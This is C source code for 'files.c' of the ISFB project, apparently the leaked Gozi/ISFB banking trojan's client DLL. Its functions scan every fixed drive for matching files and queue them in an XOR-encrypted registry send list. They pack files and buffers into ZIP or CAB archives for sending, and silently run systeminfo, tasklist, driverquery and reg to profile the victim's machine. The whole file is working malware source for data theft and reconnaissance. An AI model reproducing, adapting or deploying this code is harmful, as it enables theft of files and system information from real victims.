//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: files.c
// $Revision: 454 $
// $Date: 2015-01-24 19:31:49 +0300 (Сб, 24 янв 2015) $
// description:
//	CRM client dll. Files manipulation functions. 


#include "..\common\common.h"
#include "..\crm.h"
#include "..\crypto\crypto.h"
#include "files.h"
#include "pipes.h"

#ifdef _USE_ZIP
 #include "..\ziplib\ziplib.h"
#endif


#define		FILE_SIZE_MAX		(5*1024*1024)		// bytes
#define		DRIVE_NAME_MAX		16				// chars

#define FILE_MAP_WAIT_TIMEOUT	10*1000		// milliseconds
#define FILE_MAP_LIVE_TIMEOUT	10*60*1000	// milliseconds

#define	FILE_PACK_TIMEOUT		60000		// milliseconds

extern	LPTSTR					g_FilesRegistryKey;
extern	LPTSTR					g_RunRegistryKey;
extern	ULONG					g_MachineRandSeed;


//
//	Scans all avaliable hard drives for the files with specified Mask and links all found file into FileListHead list.
//	Returns number of files found.
//
static ULONG FilesScanDrivesW(
	PWCHAR			Mask,		// search mask
	PLIST_ENTRY		pFilesList	// list to link found files
	)
{
	ULONG	bSize, Found = 0;
	PWCHAR	DriveNames, DriveName;
	WCHAR	ScanPath[DRIVE_NAME_MAX] = {0};

	// wczDosDevicePrefix is required to search paths more then MAX_PATH chars long
	wcscpy(ScanPath, wczDosDevicePrefix);

	bSize = GetLogicalDriveStringsW(0, NULL);
	if (DriveNames = hAlloc((bSize + 2) * sizeof(WCHAR)))
	{
		memset(DriveNames, 0, (bSize + 2) * sizeof(WCHAR));
		GetLogicalDriveStringsW(bSize, DriveNames);

		DriveName = DriveNames;

		while (DriveName[0] != 0 && WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT)
		{
			if (GetDriveTypeW(DriveName) == DRIVE_FIXED)
			{
				ULONG	NameLen = wcslen(DriveName);
				if ((NameLen + (cstrlen(wczDosDevicePrefix)/sizeof(WCHAR))) < DRIVE_NAME_MAX)
				{
					wcscpy(&ScanPath[cstrlen(wczDosDevicePrefix)/sizeof(WCHAR)], DriveName);
					Found += FilesScanW(ScanPath, Mask, pFilesList, NULL, 0, 0);
				}
			}
			DriveName += (wcslen(DriveName) + 1);
		}

		hFree(DriveNames);
	}
	return(Found);
}


//
//	Thread function.
//	Scans all avaliable hard drives for the files with specified Mask and sends all found file to the files URL.
//	Returns number of file found.
//
WINERROR WINAPI FilesThread(
	PWCHAR	pMask	// search mask
	)
{
	ULONG	Found = 0;
	LIST_ENTRY	FilesList;

	InitializeListHead(&FilesList);

	DbgPrint("ISFB_%04x: FILES: Scanning for \"%S\".\n", g_CurrentProcessId, pMask);

	if (Found = FilesScanDrivesW(pMask, &FilesList))
	{
		DbgPrint("ISFB_%04x: FILES: %u matches found.\n", g_CurrentProcessId, Found);

		do 
		{
			PFILE_DESCW pFileDesc;

			pFileDesc = CONTAINING_RECORD(FilesList.Flink, FILE_DESCW, Entry);
			FilesListAddW((PWCHAR)&pFileDesc->Path, (UCHAR)pFileDesc->Type);
			RemoveEntryList(&pFileDesc->Entry);
			hFree(pFileDesc);
		} while(FilesList.Flink != &FilesList);
	}
	else
	{
		DbgPrint("ISFB_%04x: FILES: No matches found.\n", g_CurrentProcessId);
	}
	hFree(pMask);

	return(Found);
}

//
//	Queries the Pipes server for a name of a section of a file found and for a size of the file.
//	Opens the section and returns its handle and file size in bytes.
//	Doesn't requre FileInit().
//
BOOL	FilesQueryFileSection(
	IN	LPWSTR	pFilePath,	// target file path
	OUT	PHANDLE	pHandle,	// receives section handle
	OUT	PULONG	pSize		// receives size of the file in bytes
	)
{
	BOOL	Ret = FALSE;
	HANDLE	hSec = 0, hPipe = INVALID_HANDLE_VALUE;
	ULONG	Reply;
	SEC_INFO	SecInfo = {0};
	ULONG	bSize = sizeof(SEC_INFO);

	do	// not a loop
	{
		if (PipeConnect(&hPipe) != NO_ERROR)
			break;

		if (!PipeSendMessage(hPipe, CMD_GETFILE, (PCHAR)pFilePath, (lstrlenW(pFilePath) + 1) * sizeof(WCHAR)))
			break;

		if (!PipeWaitMessage(hPipe, &Reply, (PCHAR)&SecInfo, &bSize))
			break;

		if (!SecInfo.SizeOfSection)
			break;
			
		if (!(hSec = OpenFileMapping(GENERIC_READ, FALSE, (LPTSTR)&SecInfo.Name)))
			break;

		*pHandle = hSec;
		*pSize = SecInfo.SizeOfSection;
		Ret = TRUE;

	} while (FALSE);

	if (hPipe != INVALID_HANDLE_VALUE)
		CloseHandle(hPipe);

	return(Ret);
}

//
//	Creates a section from the specified file and fills the specified SEC_INFO structure with parameters of the section.
//
WINERROR FilesCreateSection(
	LPWSTR		pFilePath,	// full path to a file
	PSEC_INFO	SecInfo		// receives section parameters
	)
{
	WINERROR Status = NO_ERROR;
	PCHAR	SecName;
	ULONG	Seed = GetTickCount();
	HANDLE	hFile, hMap;

	// Opening a file
	hFile = CreateFileW(pFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, &g_DefaultSA, OPEN_EXISTING, 0, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		if (SecName = GenGuidName(&Seed, szLocal, NULL, TRUE))
		{
			ULONG	FileSize = GetFileSize(hFile, NULL);
			if (hMap = CreateFileMapping(hFile, &g_DefaultSA, PAGE_READONLY, 0, FileSize, SecName))
			{
				SecInfo->Flags = FILE_TYPE_ANY;
				SecInfo->hSection = (ULONGLONG)hMap;
				SecInfo->SizeOfSection = FileSize;
				SecInfo->NameLength = lstrlen(SecName);
				lstrcpy((PCHAR)&SecInfo->Name, SecName);

				DbgPrint("ISFB_%04x: Created section \"%s\" of %u bytes from file \"%S\"\n", g_CurrentProcessId, SecName, FileSize, pFilePath);
				ASSERT(Status == NO_ERROR);
			}	// if (hMap = CreateFileMapping(
			else
			{
				Status = GetLastError();
				DbgPrint("ISFB_%04x: Failed creating section \"%s\" of %u bytes from file \"%S\", status: %u\n", g_CurrentProcessId, SecName, FileSize, pFilePath, GetLastError());
			}
			hFree(SecName);
		}	// if (SecName = GenGuidName(&Seed, szLocal, NULL, TRUE))
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
		CloseHandle(hFile);
	}	// if (hFile != INVALID_HANDLE_VALUE)
	else
		Status = GetLastError();

	return(Status);
}


//
//	Creates a process with the specified ParamStr. Waits for the process to terminate.
//
WINERROR	FilesStartAndWaitProcess(
	LPTSTR	ParamStr, 
	LPTSTR	WorkDir
	)
{
	WINERROR	Status = NO_ERROR;
	LPSTR	pPath;
	STARTUPINFO	Si = {0};
	PROCESS_INFORMATION	Pi = {0};

	Si.cb = sizeof(STARTUPINFO);

	if (pPath = FilesExpandEnvironmentVariables(WorkDir))
		WorkDir = pPath;

	// Creating a process
	if (CreateProcess(NULL, ParamStr, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_NO_WINDOW, NULL, WorkDir, &Si, &Pi))
	{
		// Waiting for the process to complete
		WaitForSingleObject(Pi.hProcess, INFINITE);
		GetExitCodeProcess(Pi.hProcess, &Status);
		CloseHandle(Pi.hThread);
		CloseHandle(Pi.hProcess);
	}
	else
		Status = GetLastError();

	if (pPath)
		AppFree(pPath);

	return(Status);
}


#ifdef _USE_ZIP

//
//	Packs the specified file or all the files from the specified source directory into the single .ZIP file.
//  NOTE: The specified directory may contain subdirectories.
//
WINERROR FilesMakeZip(
	LPTSTR	pSourcePath,
	LPTSTR	pZipPath
	)
{
	LPWSTR	pSourcePathW, pZipFileW;
	WINERROR Status = ERROR_FILE_NOT_FOUND;

	DbgPrint("ISFB_%04x: Creating ZIP-file \"%s\" from \"%s\"\n", g_CurrentProcessId, pZipPath, pSourcePath);

#if _UNICODE
	if (pSourcePathW = FilesExpandEnvironmentVariablesW(pSourcePath))
	{
		if (pZipFileW = FilesExpandEnvironmentVariablesW(pZipFile))
#else
	if (pSourcePathW = FilesExpandEnvironmentVariablesAtoW(pSourcePath))
	{
		if (pZipFileW = FilesExpandEnvironmentVariablesAtoW(pZipPath))
#endif
		{
			ULONG	Count, PathLen;
			LIST_ENTRY	FilesList;
			LPWSTR	pFileNameW, pFileMaskW;

			InitializeListHead(&FilesList);

			PathLen = lstrlenW(pSourcePathW);

			// Trying to scan a directory first
			if ((Count = FilesScanW(pSourcePathW, wczMaskAll, &FilesList, NULL, 0, 0)) == 0)
			{
				ASSERT(IsListEmpty(&FilesList));
				
				// No directory found, looking for a single file
				if ((pFileNameW = PathFindFileNameW(pSourcePathW)) && (pFileMaskW = StrDupW(pFileNameW)))
				{
					*pFileNameW = 0;
					PathLen = lstrlenW(pSourcePathW);

					Count = FilesScanW(pSourcePathW, pFileMaskW, &FilesList, NULL, 0, 0);
					LocalFree(pFileMaskW);
				}
			}	// if ((Count = FilesScanW(pSourcePathW, wczMaskAll, &FilesList, NULL, 0, 0)) == 0)

			if (Count)
			{
				// There're one or more files found
				PLIST_ENTRY	pEntry;

				ASSERT(!IsListEmpty(&FilesList));

				pEntry = FilesList.Flink;

				while((pEntry != &FilesList) && WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT)
				{
					PFILE_DESCW	pFileDesc = CONTAINING_RECORD(pEntry, FILE_DESCW, Entry);
					pEntry = pEntry->Flink;

					if (ZipFileToHandle(pSourcePathW, (LPWSTR)&pFileDesc->Path, PathFindFileNameW((LPWSTR)&pFileDesc->Path), pZipFileW) == NO_ERROR)
						Status = NO_ERROR;

					RemoveEntryList(&pFileDesc->Entry);
					AppFree(pFileDesc);
					Count -= 1;
				}	// while((pEntry != &FilesList) && WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT)
			}	// if (Count)

			ASSERT(Count == 0);
			ASSERT(IsListEmpty(&FilesList));

			AppFree(pZipFileW);
		}	// if (pZipFileW =...
		AppFree(pSourcePathW);
	}	// if (pSourcePathW =...

	DbgPrint("ISFB_%04x: Creating ZIP done with status %u\n", g_CurrentProcessId, Status);

	return(Status);
}

#else	// _USE_ZIP

//
//	Crates CAB description file.
//
static	WINERROR BuildCabDescFile(
	LPTSTR	DescFile,	// description file path
	LPTSTR	SourcePath,	// path to the source file or a directory to make a CAB from
	LPTSTR	CabPath		// path to the future CAB-file
	)
{
	HANDLE	hFile;
	PCHAR	Str;
	LPTSTR	ShortName;
	ULONG	bLen, Written;
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;

	if (Str = hAlloc(PAGE_SIZE))
	{
		hFile = CreateFile(DescFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			if (ShortName = strrchr(CabPath, '\\'))
			{
				ShortName[0] = 0;
				bLen = wsprintf(Str, szDiskDirectory, CabPath);
				WriteFile(hFile, Str, bLen, &Written, NULL);
				ShortName[0] = '\\';
				ShortName += 1;
			}
			else
				ShortName = CabPath;

			bLen = wsprintf(Str, szCabinetName, ShortName);
			WriteFile(hFile, Str, bLen, &Written, NULL);

			if (!(GetFileAttributes(SourcePath) & FILE_ATTRIBUTE_DIRECTORY))
			{
				// Packing single file
				bLen = wsprintf(Str, szQuotes, SourcePath);
				if (WriteFile(hFile, Str, bLen, &Written, NULL))
					Status = NO_ERROR;
				else
					Status = GetLastError();
			}
			else
			{
				// Packing a directory
				LIST_ENTRY	FilesList;
				ULONG	i;
				PWCHAR	wFullName, wShortName, SearchPath;

				bLen = lstrlen(SourcePath);

				if (SearchPath = hAlloc((bLen + 1 + 1) * sizeof(WCHAR)))
				{
					mbstowcs(SearchPath, SourcePath, bLen + 1);
					SearchPath[bLen] = '\\';
					SearchPath[bLen + 1] = 0;

					Status = ERROR_NO_MORE_FILES;

					InitializeListHead(&FilesList);
					if (i = FilesScanW(SearchPath, wczMaskAll, &FilesList, NULL, 0, 0))
					{
						PLIST_ENTRY	pEntry = FilesList.Flink;
						
						while(pEntry != &FilesList)
						{
							PFILE_DESCW	FileDesc = CONTAINING_RECORD(pEntry, FILE_DESCW, Entry);
							pEntry = pEntry->Flink;

							if (!(GetFileAttributesW((PWCHAR)&FileDesc->Path) & FILE_ATTRIBUTE_DIRECTORY))
							{
								wFullName = (PWCHAR)&FileDesc->Path + FileDesc->SearchPathLen;
								if (wShortName = wcsrchr(wFullName, '\\'))
								{
									wShortName[0] = 0;
									bLen = wsprintf(Str, szDestinationDir, wFullName);
									wShortName[0] = '\\';
								}
								else
									bLen = wsprintf(Str, szDestinationDir, L"");

								WriteFile(hFile, Str, bLen, &Written, NULL);

								bLen = wsprintf(Str, "\"%S\"\r\n", wFullName);
								if (WriteFile(hFile, Str, bLen, &Written, NULL))
									Status = NO_ERROR;
								else
									Status = GetLastError();								
							}	// if (!(GetFileAttributesW((PWCHAR)&FileDesc->Path) & FILE_ATTRIBUTE_DIRECTORY))
							RemoveEntryList(&FileDesc->Entry);
							hFree(FileDesc);
						}	// while(pEntry != &FilesList)
					}	// if (i = FilesScanW(SearchPath, wczMaskAll, &FilesList, NULL, 0))
					hFree(SearchPath);
				}	// if (SearchPath = hAlloc((lstrlen(SourcePath) + 1) * sizeof(WCHAR)))
				else
				{
					ASSERT(Status == ERROR_NOT_ENOUGH_MEMORY);
				}
			}	// else // if (!(GetFileAttributes(SourcePath) & FILE_ATTRIBUTE_DIRECTORY))
			CloseHandle(hFile);
		}	// if (hFile != INVALID_HANDLE_VALUE)
		else
			Status = GetLastError();

		hFree(Str);
	}	// if (Str = hAlloc(PAGE_SIZE))

	return(Status);
}


//
//	Packs the specified file or all the files from the specified source directory into the single .CAB file.
//  NOTE: The specified directory should not contain subdirectories.
//
WINERROR	FilesMakeCab(
	LPTSTR	SourcePath,	// Source file or source directory full path
	LPTSTR	CabPath		// Target .CAB file full path
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	LPTSTR		WorkDirPath = NULL, DescFilePath = NULL, ParamStr = NULL, FileName;

	DbgPrint("ISFB_%04x: Creating CAB-file \"%s\" from \"%s\"\n", g_CurrentProcessId, CabPath, SourcePath);

	do	// not a loop
	{
		if (!(WorkDirPath = hAlloc((lstrlen(SourcePath) + cstrlen(szSetup1) + 1 + 1) * sizeof(_TCHAR))))
		{
			ASSERT(Status == ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Copying string to be able to modify it
		lstrcpy(WorkDirPath, SourcePath);

		if (!(FileName = strrchr(WorkDirPath, '\\')))
		{
			// Invalid path specified.
			Status = ERROR_PATH_NOT_FOUND;
			break;
		}

		if (!(GetFileAttributes(SourcePath) & FILE_ATTRIBUTE_DIRECTORY))
		{
			FileName[0] = 0;
			FileName += 1;
		}

		if (!(DescFilePath = FilesGetTempFile(5678)))
		{
			Status = ERROR_FILE_INVALID;
			break;
		}

		if (!(ParamStr = hAlloc((cstrlen(szMakeCabParam) + lstrlen(DescFilePath) + 1) * sizeof(_TCHAR))))
		{
			ASSERT(Status == ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Deleting CAB-file if exists
//		DeleteFile(CabPath);

		// Creating makecab description file
		if ((Status = BuildCabDescFile(DescFilePath, SourcePath, CabPath)) == NO_ERROR)
		{
			ULONG	bLen;

			// Creating parameter string 
			wsprintf(ParamStr, szMakeCabParam, DescFilePath);
	
			// Executing makecab.exe
			Status = FilesStartAndWaitProcess(ParamStr, WorkDirPath);

			// Deleting setup.inf and setup.rpt files created by makecab.exe
			bLen = lstrlen(WorkDirPath);
			lstrcat(WorkDirPath, szSetup1);
			FilesDeleteFile(WorkDirPath);

			WorkDirPath[bLen] = 0;
			lstrcat(WorkDirPath, szSetup2);
			FilesDeleteFile(WorkDirPath);

			// Deleting makecab description file
			FilesDeleteFile(DescFilePath);
		}	// if (BuildCabDescFile(DescFilePath, SourcePath, CabPath))

				
	} while(FALSE);

	if (WorkDirPath)
		hFree(WorkDirPath);

	if (DescFilePath)
		hFree(DescFilePath);

	if (ParamStr)
		hFree(ParamStr);

	DbgPrint("ISFB_%04x: Creating CAB done with status %u\n", g_CurrentProcessId, Status);

	return(Status);
}


#endif	// #else	// _USE_ZIP


//
//	Converst the specified UTF-16 text file to UTF-8 encoding.
//
WINERROR FilesUtf16ToUtf8(
	LPTSTR	FilePath
	)
{
	WINERROR Status;
	PCHAR	pSrcData, pDestData;
	ULONG	Size;
	LONG	DestSize;

	if ((Status = FilesLoadFile(FilePath, &pSrcData, &Size)) == NO_ERROR)
	{
		Size /= sizeof(WCHAR);

		// Determining number of bytes requred to store the target data
		DestSize = WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)pSrcData, Size, NULL, 0, NULL, NULL);

		// Allocating buffer for the target data
		if (DestSize > 0 && (pDestData = hAlloc(DestSize)))
		{
			// Converting
			DestSize = WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)pSrcData, Size, pDestData, DestSize, NULL, NULL);
			if (DestSize > 0)
				Status = FilesSaveFile(FilePath, pDestData, DestSize, FILE_FLAG_OVERWRITE);
			else
				Status = GetLastError();

			hFree(pDestData);
		}	// if (pDestData = hAlloc(Size))
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
		hFree(pSrcData);
	}	// if ((Status = FilesLoadFile(FilePath, &pData, &Size)) == NO_ERROR)

	return(Status);
}

//
//	Packs target file and adds packed one to the send list.
//	
WINERROR __stdcall FilesPackAndSend(
	PVOID	Context,		// for compatibility with ISFB plugins
	LPTSTR	FilePath,		// Path to the file or directory to pack and send
	ULONG	Flags			// Variouse flags to store within FILE_DESCW
	)
{
	LPTSTR	TempPath = NULL;
	WINERROR	Status;
	HANDLE	hFile;

	do
	{
		if (!(TempPath = FilesGetTempFile(7890)))
		{
			Status = ERROR_FILE_INVALID;
			break;
		}

		// Packing the specified source file into the TEMP file
		if ((Status = FilesPackFiles(FilePath, TempPath)) != NO_ERROR)
			break;

		hFile = CreateFile(TempPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		// Checking if packing completed succsfully and we have a packed file
		if (hFile == INVALID_HANDLE_VALUE)
		{
			Status = ERROR_FILE_NOT_FOUND;
			break;
		}

		DbgPrint("ISFB_%04x: Adding \"%s\" to the send file list\n", g_CurrentProcessId, TempPath);

		// Adding the TEMP file to the send list
		Status = FilesListAddA(TempPath, (UCHAR)Flags);

		// Releasing file handle
		CloseHandle(hFile);

	} while(FALSE);

	if (TempPath)
		hFree(TempPath);

	UNREFERENCED_PARAMETER(Context);
	return(Status);
}

#ifdef _ENABLE_SYSINFO

//
//	Creates a temporary file and executes SYSTEMINFO with output redirected to this file.
//	Returns the file name.
//
WINERROR	FilesGetSysInfo(LPTSTR* pFileName)
{
	WINERROR	Status;
	LPTSTR		TempPath = NULL, ParamStr = NULL;
	ULONG		bSize;

	DbgPrint("ISFB_%04x: Executing systeminfo\n", g_CurrentProcessId);

	do	// not a loop
	{
		if (!(TempPath = FilesGetTempFile(9012)))
		{
			Status = ERROR_FILE_INVALID;
			break;
		}

		// Calculating maximum size of the param string
		bSize = cstrlen(szCmdParam) + max(max(max(cstrlen(szSysinfoParam), cstrlen(szTasklistParam)), cstrlen(szRegParam)), cstrlen(szDriverParam));

		// Allocating the param string
		if (!(ParamStr = hAlloc((bSize + 3*lstrlen(TempPath) + 1) * sizeof(_TCHAR))))
		{
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// --- Gathering system information ---
		// Creating parameter string 
		wsprintf(ParamStr, szCmdParam, szSysinfoParam, TempPath);
		// Executing systeminfo.exe
		if ((Status = FilesStartAndWaitProcess(ParamStr, NULL)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: systeminfo.exe failed to start.\n", g_CurrentProcessId);
		}

		// Adding info delimiter
		wsprintf(ParamStr, szCmdParam, szInfoDelimiter, TempPath);
		FilesStartAndWaitProcess(ParamStr, NULL);

		//--- Gathering processes and services information ---
		// Creating parameter string 
		wsprintf(ParamStr, szCmdParam, szTasklistParam, TempPath);
		// Executing tasklist.exe
		if ((Status = FilesStartAndWaitProcess(ParamStr, NULL)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: tasklist.exe failed to start.\n", g_CurrentProcessId);
		}

		// Adding info delimiter
		wsprintf(ParamStr, szCmdParam, szInfoDelimiter, TempPath);
		FilesStartAndWaitProcess(ParamStr, NULL);

		//--- Gathering installed drivers information ---
		// Creating parameter string 
		wsprintf(ParamStr, szCmdParam, szDriverParam, TempPath);
		// Executing driverquery.exe
		if ((Status = FilesStartAndWaitProcess(ParamStr, NULL)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: driverquery.exe failed to start.\n", g_CurrentProcessId);
		}

		// Adding info delimiter
		wsprintf(ParamStr, szCmdParam, szInfoDelimiter, TempPath);
		FilesStartAndWaitProcess(ParamStr, NULL);

		//--- Gathering installed software information ---
		// Creating parameter string 
		wsprintf(ParamStr, szCmdParam, szRegParam, TempPath);
		// Executing reg.exe
		if ((Status = FilesStartAndWaitProcess(ParamStr, NULL)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: reg.exe failed to start.\n", g_CurrentProcessId);
		}

		//--- Converting target file to unicode ---
		wsprintf(ParamStr, szTypeParam, TempPath, TempPath, TempPath);
		// Executing convertion commands
		if ((Status = FilesStartAndWaitProcess(ParamStr, NULL)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: Failed converting target file to UTF-16, error %u\n", g_CurrentProcessId, Status);
		}

#ifdef	_SYSINFO_UTF8

		//--- Converting target file to UTF-8 ---
		if ((Status = FilesUtf16ToUtf8(TempPath)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: Failed converting target file to UTF-8, error %u\n", g_CurrentProcessId, Status);
		}
#endif	// _SYSINFO_UTF8

		DbgPrint("ISFB_%04x: Systeminfo stored to file: \"%s\"\n", g_CurrentProcessId, TempPath);
		*pFileName = TempPath;
		Status = NO_ERROR;
	} while(FALSE);

	if (ParamStr)
		hFree(ParamStr);

	if (Status != NO_ERROR && (TempPath))
		hFree(TempPath);

	DbgPrint("ISFB_%04x: Systeminfo done with status %u\n", g_CurrentProcessId, Status);

	return(Status);
}

#endif	// _ENABLE_SYSINFO



ULONG FilesScanObjectsW(
	PWCHAR				DirPath,			// directory to search in, should be ended with "\"
	PWCHAR				NameMask,		// search mask
	ULONG				TypeMask,
	ULONG				DirPathLen,
	PLIST_ENTRY			FilesList,
	ULONG				ScanFlags
	)	
{
	ULONG	Count = 0;
	HANDLE	hDir;
	NTSTATUS ntStatus;
	UNICODE_STRING	uDirName;
	OBJECT_ATTRIBUTES Oa;
	PFILE_DESCW	FileDesc;

	RtlInitUnicodeString(&uDirName, DirPath);
	InitializeObjectAttributes(&Oa, &uDirName, OBJ_CASE_INSENSITIVE, 0, NULL);

	ntStatus = NtOpenDirectoryObject(&hDir, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &Oa);
	if (NT_SUCCESS(ntStatus))
	{
		PDIRECTORY_CONTENTS	Buffer;
		ULONG	Context, bSize;

		if (DirPathLen == 0)
			DirPathLen = lstrlenW(DirPath);

		if (Buffer = (PDIRECTORY_CONTENTS)hAlloc(PAGE_SIZE))
		{
			ntStatus = NtQueryDirectoryObject(hDir, Buffer, PAGE_SIZE, TRUE, TRUE, &Context, &bSize);

			while(NT_SUCCESS(ntStatus))
			{
				ULONG TypeCrc = Crc32((PCHAR)Buffer->Entry->Type.Buffer, Buffer->Entry->Type.Length);
				WCHAR z = Buffer->Entry->Name.Buffer[Buffer->Entry->Name.Length];
				Buffer->Entry->Name.Buffer[Buffer->Entry->Name.Length] = 0;

				if (__wcswicmp(NameMask, Buffer->Entry->Name.Buffer))
				{
					ULONG FullPathSize = (DirPathLen + 1) * sizeof(WCHAR) +  Buffer->Entry->Name.Length + sizeof(WCHAR);

					if (FileDesc = hAlloc(sizeof(FILE_DESCW) + FullPathSize + Buffer->Entry->Type.Length + sizeof(WCHAR)))
					{
						FileDesc->SearchPathLen = DirPathLen;
						FileDesc->Type = TypeCrc;
						FileDesc->TypeOffset = FullPathSize;
						lstrcpyW((PWCHAR)&FileDesc->Path, DirPath);
						lstrcatW((PWCHAR)&FileDesc->Path, L"\\");
						lstrcatW((PWCHAR)&FileDesc->Path, Buffer->Entry->Name.Buffer);	

						Buffer->Entry->Name.Buffer[Buffer->Entry->Name.Length] = z;
						Buffer->Entry->Type.Buffer[Buffer->Entry->Type.Length] = 0;
						lstrcpyW((PWCHAR)((PCHAR)&FileDesc->Path + FullPathSize), Buffer->Entry->Type.Buffer);


						InitializeListHead(&FileDesc->Entry);
						InsertTailList(FilesList, &FileDesc->Entry);
						Count += 1;
					}
				}	// if (!__wcswicmp(NameMask, Buffer->Entry->Name.Buffer))

				if ((TypeCrc == CRC_DIRECTORY) && (ScanFlags & FILES_SCAN_SUBDIRECTORIES))
				{
					PWCHAR	NewDirPath;
					if (NewDirPath = hAlloc((DirPathLen + 1 + 1) * sizeof(WCHAR) + Buffer->Entry->Name.Length))
					{
						lstrcpyW(NewDirPath, DirPath);
						lstrcatW(NewDirPath, L"\\");
						lstrcatW(NewDirPath, Buffer->Entry->Name.Buffer);
						Count += FilesScanObjectsW(NewDirPath, NameMask, TypeMask, 
							DirPathLen + (Buffer->Entry->Name.Length) / sizeof(WCHAR) + 1 ,	FilesList, ScanFlags);

						hFree(NewDirPath);
					}	// if (NewDirPath = hAlloc((DirPathLen + 1 + 1) * sizeof(WCHAR) + Buffer->Entry->Name.Length))
				}	// if ((TypeCrc == CRC_DIRECTORY) && (ScanFlags & FILES_SCAN_SUBDIRECTORIES))
				ntStatus = NtQueryDirectoryObject(hDir, Buffer, PAGE_SIZE, TRUE, FALSE, &Context, &bSize);
			}	// while(NT_SUCCESS(ntStatus))
			hFree(Buffer);
		}	// if (Buffer = (PDIRECTORY_CONTENTS)hAlloc(PAGE_SIZE))
		NtClose(hDir);
	}	// if (NT_SUCCESS(ntStatus))

	return(Count);
}


WINERROR __stdcall FilesPackAndSendBuffer(
	PVOID	Context,	// For compatibility with ISFB plugins
	PCHAR	pBuffer,	// Data buffer to pack and send
	ULONG	Size,		// Size of thebuffer in bytes
	ULONG	FileType	// Send ID
	)
{
	WINERROR	Status = ERROR_FILE_INVALID;
	LPTSTR		TempPath;

	if (TempPath = FilesGetTempFile(2345))
	{
		if ((Status = FilesSaveFile(TempPath, pBuffer, Size, FILE_FLAG_OVERWRITE)) == NO_ERROR)
			Status = FilesPackAndSend(Context, TempPath, FileType);

		DeleteFile(TempPath);
		hFree(TempPath);		
	}	// if (TempPath = FilesGetTempFile())

	return(Status);
}

//
//	Adds an encrypted binary value to the specified registry key.
//
WINERROR FilesAddEncryptedValue(
	LPTSTR	pKeyName,	// name of the key
	LPTSTR	pValueName,	// name of the value to add	
	PCHAR	pValue,		// data for the value
	ULONG	ValueSize	// size of the value data in bytes
	)
{
	HKEY	hKey;
	WINERROR Status;
	PCHAR	pBuffer;

	if (pBuffer = AppAlloc(ValueSize))
	{
		// Copying our value to a separate buffer to encrypt it there
		memcpy(pBuffer, pValue, ValueSize);

		if ((Status = RegCreateKey(HKEY_CURRENT_USER, pKeyName, &hKey)) == NO_ERROR)
		{
			// Encrypting file path
			XorEncryptBuffer(pBuffer, ValueSize, g_MachineRandSeed, FALSE);
			// Saving file path into the registry value
			Status = RegSetValueEx(hKey, pValueName, 0, REG_BINARY, pBuffer, ValueSize);

			RegCloseKey(hKey);
		}	// if ((Status = RegCreateKey(HKEY_CURRENT_USER, g_FilesRegistryKey, &hKey)) == NO_ERROR)
		AppFree(pBuffer);
	}	// if (pBuffer = AppAlloc(ValueSize))
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	return(Status);
}


//
//	Stores the specified file path to the files send list within the registry.
//
WINERROR FilesListAddW(
	LPWSTR	pName,	// full path to a file
	UCHAR	Type
	)
{
	LPTSTR	pParamName;
	ULONG	TimeHi;
	GUID	Guid;
	TEMP_NAME BinName;
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;

	if (CoCreateGuid(&Guid) != S_OK)
	{
		// Random number from system time 
		GetSystemTimeAsFileTime(&BinName.Time);
		// Byte swap to make a readable number
		TimeHi = htonL(BinName.Time.dwHighDateTime);
		BinName.Time.dwHighDateTime = htonL(BinName.Time.dwLowDateTime);
		BinName.Time.dwLowDateTime = TimeHi;
	}
	else
		memcpy((PCHAR)&BinName, (PCHAR)&Guid, min(sizeof(GUID), sizeof(TEMP_NAME)));

	BinName.Type = Type;

	if (pParamName = hAlloc((sizeof(TEMP_NAME) * 2 + 1) * sizeof(_TCHAR)))
	{
		StrBufferToHex(&BinName, sizeof(TEMP_NAME), pParamName);
		pParamName[sizeof(TEMP_NAME) * 2] = 0;

		Status = FilesAddEncryptedValue(g_FilesRegistryKey, pParamName, (PCHAR)pName, (lstrlenW(pName) + 1) * sizeof(WCHAR));

		hFree(pParamName);
	}	// if (pParamName = hAlloc((sizeof(FILETIME) * 2 + 1) * sizeof(_TCHAR)))

	return(Status);
}


//
//	Stores the specified file path to the files send list within the registry.
//
WINERROR FilesListAddA(
	LPSTR	pName,	// full path to a file
	UCHAR	Type
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	LPWSTR	pNameW;
	ULONG	Len = lstrlen(pName);

	if (pNameW = hAlloc((Len + 1) * sizeof(WCHAR)))
	{
		mbstowcs(pNameW, pName, Len + 1);

		Status = FilesListAddW(pNameW, Type);

		hFree(pNameW);
	}	// if (pNameW = hAlloc((Len + 1) * sizeof(WCHAR)))

	return(Status);
}

